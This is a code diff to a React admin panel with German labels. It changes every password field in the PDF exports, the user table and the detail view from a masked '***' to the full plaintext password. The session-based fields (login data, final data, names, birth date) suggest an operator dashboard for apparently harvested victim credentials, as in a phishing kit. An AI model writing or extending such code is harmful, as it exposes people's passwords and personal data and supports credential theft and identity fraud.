@@ -349,7 +349,7 @@ const AdminPanel: React.FC = () => {
       // Login Information
       yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
       yPosition = addText(`Benutzername: ${session.loginData?.xusr || session.finalData?.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-      yPosition = addText(`Passwort: ${(session.loginData?.xpss || session.finalData?.xpss) ? '***' : 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+       yPosition = addText(`Passwort: ${session.loginData?.xpss || session.finalData?.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition += 5;
 
       // Personal Information
@@ -427,7 +427,7 @@ const AdminPanel: React.FC = () => {
     // Login Information
     yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
     yPosition = addText(`Benutzername: ${selectedUser.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
-    yPosition = addText(`Passwort: ${selectedUser.xpss ? '***' : 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+         yPosition = addText(`Passwort: ${selectedUser.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition += 10;
 
     // Personal Information
@@ -739,7 +739,7 @@ const AdminPanel: React.FC = () => {
               {processedUsers.map((user, index) => (
                 <tr key={index} data-session={user.sessionId}>
                   <td title={`Username: ${user.xusr}`}>{user.xusr || '-'}</td>
-                  <td title={`Password: ${user.xpss ? 'Set' : 'Not set'}`}>{user.xpss ? '***' : '-'}</td>
+                  <td title={`Password: ${user.xpss || 'Not set'}`}>{user.xpss || '-'}</td>
                   <td title={`First Name: ${user.xname1}`}>{user.xname1 || '-'}</td>
                   <td title={`Last Name: ${user.xname2}`}>{user.xname2 || '-'}</td>
                   <td title={`Birth Date: ${user.xdob}`}>{user.xdob || '-'}</td>
@@ -1051,10 +1051,10 @@ const AdminPanel: React.FC = () => {
                       <strong>Benutzername:</strong><br/>
                       <span style={{color: '#333'}}>{selectedUser.xusr || 'Nicht angegeben'}</span>
                     </div>
-                    <div>
-                      <strong>Passwort:</strong><br/>
-                      <span style={{color: '#333'}}>{selectedUser.xpss ? '***' : 'Nicht angegeben'}</span>
-                    </div>
+                     <div>
+                       <strong>Passwort:</strong><br/>
+                       <span style={{color: '#333'}}>{selectedUser.xpss || 'Nicht angegeben'}</span>
+                     </div>
                   </div>
                 </div>
 
